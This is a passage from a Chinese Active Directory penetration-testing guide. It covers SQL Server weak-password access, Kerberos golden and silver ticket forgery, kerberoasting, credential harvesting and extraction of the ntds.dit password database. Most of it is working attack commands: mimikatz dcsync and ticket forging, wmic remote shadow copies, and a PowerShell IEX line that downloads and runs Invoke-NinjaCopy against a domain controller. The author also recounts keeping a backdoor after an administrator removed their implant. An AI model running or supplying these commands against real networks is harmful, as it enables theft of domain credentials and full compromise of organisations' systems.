    [*] ----------------------------------------------------------------------    [-] Failed   - server1.mydomain.com is not responding to pings
    [-] Failed   - server2.mydomain.com (192.168.1.102) is up, but authentication/query failed
    [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
    [+] SUCCESS! - server3.mydomain.comSQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
    [+] SUCCESS! - server4.mydomain.comAppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes             
    [*] ----------------------------------------------------------------------    [*] 3 of 5 SQL Server instances could be accessed.        
    [*] End Time: 04/01/2014 10:02:00      
    [*] Total Time: 00:02:00
    [*] ----------------------------------------------------------------------
弱口令猜解
    Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@#
寻找敏感数据
    Get-SQLServerAccess -query "select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1"
更多参考：
[非扫描式的SQL Server发现](https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning)
相关资料：
[SPN扫描](https://adsecurity.org/?p=1508)
[扫描SQLServer脚本](https://github.com/PyroTek3/PowerShell-AD-Recon)
###  Kerberos黄金门票
[域服务账号破解实践](http://bobao.360.cn/learning/detail/3564.html)
[kerberos认证原理](http://blog.csdn.net/wulantian/article/details/42418231)
[深刻理解windows安全认证机制ntlm & Kerberos](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)
####  Kerberos身份验证流程
  * 密码转换为NTLM哈希值，时间戳使用散列加密，并作为身份验证票据（TGT）请求（AS-REQ）中的身份验证器发送给KDC。
  * 域控制器（KDC）检查用户信息（登录限制，组成员身份等）并创建票证授予票证（TGT）。
  * TGT被加密，签名并交付给用户（AS-REP）。只有域中的Kerberos服务（KRBTGT）才能打开并读取TGT数据。
  * 用户在申请票证授予服务（TGS）票证（TGS-REQ）时向TG提交TGT。DC打开TGT并验证PAC校验和 – 如果DC可以打开票证和校验和签出，则TGT =有效。TGT中的数据被有效地复制来创建TGS票据。
  * 使用目标服务帐户的NTLM密码散列对TGS进行加密并发送给用户（TGS-REP）。
  * 用户在适当的端口上连接到托管服务的服务器并呈现TGS（AP-REQ）。该服务使用其NTLM密码散列打开TGS票证。
其实可以说是一种后门而不是什么漏洞。
黄金票据是伪造TGT,可以获取任何Kerberos服务权限,与域控制器没有AS-REQ或AS-REP（步骤1和2）通信。由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据。
Kerberos黄金票证是有效的TGT Kerberos票证，因为它是由域Kerberos帐户（KRBTGT）加密/签名的
。TGT仅用于向域控制器上的KDC服务证明用户已被其他域控制器认证。TGT被KRBTGT密码散列加密并且可以被域中的任何KDC服务解密的事实证明它是有效的  
利用条件：
1.普通域用户
2.krbtgt ntlm hash
3.域SID
在域上抓取hash
    lsadump::dcsync /domain:pentest.com /user:krbtgt
    kerberos::purge
    kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi
    kerberos::ptt administrator.kiribi
    kerberos::tgt
    net use k: \pentest.comc$
### Kerberos银票务
[攻击者如何使用Kerberos银票来利用系统](https://adsecurity.org/?p=2011)
[https://www.feiworks.com/wy/drops/域渗透——Pass%20The%20Ticket.pdf](https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf)
黄金票据和白银票据的一些区别:
Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限
Silver Ticket: 伪造TGS,只能访问指定的服务
加密方式不同:
Golden Ticket 由krbtgt的hash加密
Silver Ticket 由服务账号(通常为计算机账户)Hash加密
认证流程不同:
Golden Ticket在使用的过程需要同域控通信
Silver Ticket在使用的过程不需要同域控通信
用户在适当的端口上连接到托管服务的服务器并呈现TGS（AP-REQ）。该服务使用其NTLM密码散列打开TGS票证。
与域控制器没有AS-REQ / AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于银票是伪造的TGS，所以没有与域控制器通信。  
银票是伪造的Kerberos票证授予服务（TGS）票据，也称为服务票据。
域上获取信息
    mimikatz log "sekurlsa::logonpasswords"
首先需要获得如下信息:
/domain
/sid
/target:目标服务器的域名全称，此处为域控的全称
/service:目标服务器上面的kerberos服务，此处为cifs
/rc4:计算机账户的NTLM hash，域控主机的计算机账户
/user:要伪造的用户名，此处可用silver测试
    mimikatz.exe "kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt"
就可以访问域的cifs共享，访问其它是不行的,Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限
###  域服务账号破解
与上面SPN扫描类似的原理
获取所有用作SPN的帐户
    setspn -T PENTEST.com -Q */*
从Mimikatz的ram中提取获得的门票
    kerberos::list /export
用rgsrepcrack破解
    tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
没复现成功
###  凭证盗窃
最常用的手法域管理登录历史记录,记得获取某边界权限一个然后抓取hash并没有域管理的,可能是搞的动静有点大,管理员第二天上去把马给清除了,还好留了有后门再次抓取hash直接获取到域管理员。
大多数Active
Directory管理员使用用户帐户登录到其工作站，然后使用RunAs（将其管理凭据放置在本地工作站上）或RDP连接到服务器运行Mimikatz
读取密码，收集密码尝试登录管理员机器一般只要域管理员登录过的机器抓取都可以获取域控了
防： 管理员不应该拿着域用户去登录web服务器或者邮件服务器一但这些被攻破抓取的密码就是域了
###  ARP
最后才是ARP欺骗不到最后不要拿出来。
Responder
cain
ettercap
BDFProxy
## 获取AD Hash
[攻击者如何转储Active Directory数据库](https://adsecurity.org/?p=2398)
活动目录数据库（ntds.dit）
Active
Directory域数据库存储在ntds.dit文件中（默认存储在c:WindowsNTDS中,AD数据库是Jet数据库引擎，它使用提供数据存储和索引服务的可扩展存储引擎（ESE）ESE级索引使对象属性可以快速定位。ESE确保数据库符合ACID（原子性，一致性，隔离性和持久性）
– 交易中的所有操作完成或不执行。AD ESE数据库非常快速和可靠。
[目录分区](https://technet.microsoft.com/en-us/library/cc961591.aspx)
ntds.dit文件由三个主表组成：数据表，链接表和SD表。
具体详细资料查看:
###  使用VSS卷影副本
什么是卷影副本?
卷影副本，也称为快照，是存储在 Data Protection Manager (DPM)
服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。
支持操作系统：
Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows
Server 2008 R2, Windows Server 2012, Windows 8
通常拿下一台服务器时准备内网渗透，需要传你的工具到目标机器中，而且是长久渗透的这种，为了不被发现！获取系统SAM文件等
使用VSS卷影副本（通过WMI或PowerShell远程处理）远程提取ntds.dit
Windows有一个名为WMI的内置管理组件，支持远程执行（需要管理员权限）。WMIC是在远程计算机上执行命令的WMI命令工具。
利用WMIC（或PowerShell远程处理）创建（或复制现有的）VSS。
    wmic /node:AD /user:PENTESTAdministrator /password:123qweQWE!@# process call create "cmd /c vssadmin create shadow /for=c: 2>&1 > c:vss.log"
查看vss.log
    wmic /node:AD /user:PENTESTadministrator /password:123qwe!@#!@# process call create "cmd /c copy 卷影IDWindowsNTDSNTDS.dit C:windowstempNTDS.dit 2>&1"
    wmic /node:AD /user:PENTESTadministrator /password:123qwe!@# process call create "cmd /c copy 卷影IDWindowsSystem32configSYSTEM c:windowstempSYSTEM.hive 2>&1"
    net use k: \pentest.comc$
利用这种方法可以和上面的Kerberos票结合来实现
使用DIT Snapshot Viewer可以验证我们是否成功地获得了ntds.dit文件。
https://github.com/yosqueoy/ditsnap
###  NTDSUtil获取ntds.dit文件
Ntdsutil.exe是一个为Active Directory提供管理设施的命令行工具。
使用NTDSUTIL的IFM创建（VSS卷影副本）在DC上本地引用ntds.dit
NTDSUtil是本地处理AD
DB的命令实用程序（ntds.dit），并为DCPromo启用IFM集创建。IFM与DCPromo一起用于“从媒体安装”,因此被升级的服务器不需要通过网络从另一个DC复制域数据。
    ntdsutil "ac i ntds" "ifm" "create full c:temp" q q
当创建一个IFM时，VSS快照被拍摄，挂载，ntds.dit文件和相关数据被复制到目标文件夹中。
此命令也可以通过WMI或PowerShell远程执行。
###  PowerShell提取ntds.dit
使用PowerSploit的Invoke-NinjaCopy远程提取ntds.dit（需要在目标DC上启用PowerShell远程处理功能）。
Invoke-NinaCopy是一个PowerShell函数，它可以利用PowerShell远程处理（必须在目标DC上启用PowerShell远程处理），从远程计算机上复制文件（即使文件已锁定，可直接访问文件）。
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:windowsntdsntds.dit" -ComputerName "AD" -LocalDestination "C:tempntds.dit"
### 使用Mimikatz提取
使用Mimikatz在提取Active Directory hash
    mimikatz lsadump::lsa /inject exit
使用RID 502的帐户是KRBTGT帐户，使用RID 500的帐户是域的默认管理员。
获取对Active Directory数据库文件的访问权限（ntds.dit）
Active Directory数据库（ntds.dit）包含有关Active Directory域中所有对象的所有信息
该文件还包含所有域用户和计算机帐户的密码哈希值。
有时候域控升级等会把ntds.dit备份文件可从共享服务器中找到可以不用直接从域控制复制